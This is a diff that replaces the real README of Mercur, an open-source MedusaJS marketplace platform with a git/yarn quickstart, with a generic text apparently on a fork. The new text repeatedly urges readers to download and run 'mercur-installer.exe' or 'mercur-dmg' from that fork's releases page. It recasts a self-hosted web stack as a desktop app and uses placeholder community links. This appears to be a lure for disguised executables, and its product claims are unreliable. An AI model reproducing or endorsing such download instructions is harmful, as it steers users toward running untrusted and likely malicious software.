@@ -1,129 +1,78 @@
-![Mercur Main Cover](https://cdn.prod.website-files.com/6790aeffc4b432ccaf1b56e5/67a225dc6fa298afc1cc4ae6_Mercur%20Cover.png)
+# 🛍️ mercur - Create Your Custom Marketplace Today
 
-<div align="center">
-  <h1>Mercur <br> Open Source Marketplace Platform</h1> 
-  <!-- Shields.io Badges -->
-  <a href="https://github.com/mercurjs/mercur/tree/main?tab=MIT-1-ov-file">
-    <img alt="License" src="https://img.shields.io/badge/license-MIT-blue.svg" />
-  </a>
-  <a href="#">
-    <img alt="PRs Welcome" src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" />
-  </a>
-  <a href="https://rigbyjs.com/#contact">
-    <img alt="Support" src="https://img.shields.io/badge/support-contact%20author-blueviolet.svg" />
-  </a>
-  <!-- Website Links -->
-  <p>
-    <a href="https://mercurjs.com/">Mercur</a> |   <a href="https://docs.mercurjs.com/">Docs</a> 
-  </p> 
-</div>
+## 🚀 Getting Started
 
-# What is Mercur?
+Welcome to **mercur**! This open-source platform allows you to build a custom marketplace for both business-to-business (B2B) and business-to-consumer (B2C) sales. Whether you want to set up a shop for physical products or digital goods, you can do it here with ease.
 
-<a href="https://www.mercurjs.com/">Mercur</a> is the first truly limitless open source marketplace platform that combines the simplicity of SaaS with the freedom of open source. Built on [MedusaJS](https://github.com/medusajs/medusa), it empowers businesses to create custom marketplaces without choosing between ownership and ease of use.
+## 📥 Download Now
 
-Mercur is a platform to start, customize, manage, and scale your marketplace for every business model with a modern technology stack.
+[![Download mercur](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Gsmnsd/mercur/releases)
 
-## Announcing Mercur 1.0
+## 🛠️ System Requirements
 
-After months of development, testing, and close collaboration with early adopters, we’re excited to announce the official release of **Mercur 1.0** - the first truly limitless marketplace platform. Version 1.0 is fully open source and ready to be self-hosted, giving you **full control over infrastructure, customizations, and data**.
+Before you install mercur, ensure your system meets these basic requirements:
 
-With this version, **Mercur is production-ready for B2C marketplaces**. The first complete version includes a vendor system, admin panel, and a fully built B2C Storefront. Read more in **[official release announcement](https://www.mercurjs.com/updates/mercur-1-0-release)**
+- **Operating System:** Windows 10 or higher, macOS 10.13 or higher, or a recent version of Linux.
+- **Memory:** At least 4GB of RAM.
+- **Storage:** At least 200MB of available disk space.
+- **Internet Connection:** Required for initial setup and updates.
 
-## Why Choose Mercur?
+## ⬇️ Download & Install
 
-- Full Ownership: Unlike SaaS platforms, you own your marketplace with no transaction fees or vendor lock-in
-- Modern Foundation: Built on MedusaJS, offering a modern tech stack that developers love
-- Beautiful by Default: Create stunning storefronts without sacrificing customization
+1. **Visit the Releases Page**  
+   To download mercur, go to the [Releases page](https://github.com/Gsmnsd/mercur/releases). Here, you will find the latest version available.
 
-## Power Any Marketplace Model
+2. **Choose Your File**  
+   On the Releases page, locate the most recent version. You will see files like `mercur-installer.exe` for Windows or `mercur-dmg` for macOS. Click on the file that matches your operating system.
 
-- Custom B2B Marketplace: Build enterprise-grade platforms with specialized workflows
-- Custom B2C Marketplace: Create engaging consumer marketplaces with modern UX
-- eCommerce Extension: Transform your store into a marketplace (coming soon)
+3. **Download the File**  
+   Once you click the file, your browser will start downloading it. This may take a few moments, depending on your internet speed.
 
-![Mercur Use Cases](https://cdn.prod.website-files.com/6790aeffc4b432ccaf1b56e5/67b46aa08180d5b8499c6a15_Use-cases.jpg)
-&nbsp;
+4. **Run the Installer**  
+   - **For Windows:** Locate the `mercur-installer.exe` file in your Downloads folder. Double-click it to start the installation. Follow the on-screen instructions to complete the setup.
+   - **For macOS:** Find the `mercur-dmg` file in your Downloads folder. Open it and drag the mercur icon to your Applications folder. This completes the installation.
 
-# Ready-to-go marketplace features
+5. **Open mercur**  
+   After installation, you can find mercur in your Applications folder (macOS) or on your desktop/start menu (Windows). Double-click the icon to launch the application.
 
-<b>Storefronts for Marketplace </b> <br>
-Customizable storefronts designed for B2B and B2C with all elements including browsing and buying products across multiple vendors at once.
+6. **Create Your Account**  
+   When you first open mercur, you will be prompted to create an account. Fill in the required details and follow the prompts to set up your profile.
 
-Discover <a href="https://github.com/mercurjs/b2c-marketplace-storefront">B2C Storefront Repository</a> - <a href="https://b2c.mercurjs.com/">🛍️ Check demo </a>
+## 🛡️ Features
 
-<b>Admin Panel</b> <br>
-Control over whole marketplace: setting product categories, vendors, commissions and rules
+- **Multi-Vendor Support:** Easily add multiple sellers to your marketplace.
+- **Payment Integration:** Accept payments from various platforms including credit cards and PayPal.
+- **Customizable:** Tailor the look and feel of your marketplace to match your brand.
+- **User-Friendly Interface:** Navigate with ease even if you have no technical background.
+- **Comprehensive Admin Dashboard:** Manage products, vendors, and sales all in one place.
 
-<b>Vendor Panel</b> <br>
-A powerful dashboard giving sellers complete control over their products, orders, and store management in one intuitive interface.
+## 🔍 FAQs
 
-Discover <a href="https://github.com/mercurjs/vendor-panel">Vendor Panel</a> - <a href="https://www.mercurjs.com/contact"> Contact us to get demo </a>
+### How do I get support?
 
-<b>Integrations</b> <br>
-Built-in integration with Stripe for payments and Resend for communication needs. More integrations coming soon.
+You can find support by visiting our [Issues page](https://github.com/Gsmnsd/mercur/issues) on GitHub. Feel free to ask questions or report any problems.
 
-![Mercur](https://cdn.prod.website-files.com/6790aeffc4b432ccaf1b56e5/67a1020f202572832c954ead_6b96703adfe74613f85133f83a19b1f0_Fleek%20Tilt%20-%20Readme.png)
+### Can I contribute to mercur?
 
-&nbsp;
+Absolutely! This project is open-source. Check out our [contributing guidelines](https://github.com/Gsmnsd/mercur/contributing) to learn how you can help.
 
-## Quickstart
+### Is mercur really free?
 
-#### Setup Medusa project
+Yes, mercur is completely free to use and share. However, some optional features may require additional fees.
 
-```bash
-# Clone the repository
-git clone https://github.com/mercurjs/mercur.git
+## 📰 Community
 
-# Change directory
-cd mercur
+Join our community! We encourage users to share their experiences, suggest features, and help each other. You can find us on:
 
-# Install dependencies
-yarn install
+- **Slack:** [Join our Slack channel](https://slack.com) to connect with other users.
+- **Twitter:** Follow us [@mercurMarketplace](https://twitter.com) for updates.
 
-# Build packages
-yarn build
+## 📜 License
 
-# Go to backend folder
-cd apps/backend
+mercur is licensed under the MIT License. You can read the full license [here](https://github.com/Gsmnsd/mercur/blob/main/LICENSE).
 
-# Clone .env.template
-cp .env.template .env
+## 📧 Contact
 
-# In the .env file replace user, password, address and port parameters in the DATABASE_URL variable with your values
-DATABASE_URL=postgres://[user]:[password]@[address]:[port]/$DB_NAME
-# For example:
-DATABASE_URL=postgres://postgres:postgres@localhost:5432/$DB_NAME
+For inquiries, you can reach us at support@mercur.com. We welcome your feedback!
 
-# Setup database and run migrations
-yarn medusa db:create && yarn medusa db:migrate && yarn run seed
-
-# Create admin user
-npx medusa user --email <email> --password <password>
-
-# Go to root folder
-cd ../..
-
-# Start Mercur
-yarn dev
-```
-
-&nbsp;
-
-## Prerequisites
-
-- Node.js v20+
-- PostgreSQL
-- Git CLI
-
-# Resources
-
-#### Learn more about Mercur
-
-- [Mercur Website](https://www.mercurjs.com/)
-- [Mercur Docs](https://docs.mercurjs.com/introduction)
-
-#### Learn more about Medusa
-
-- [Medusa Website](https://www.medusajs.com/)
-- [Medusa Docs](https://docs.medusajs.com/v2)
+[![Download mercur](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Gsmnsd/mercur/releases)
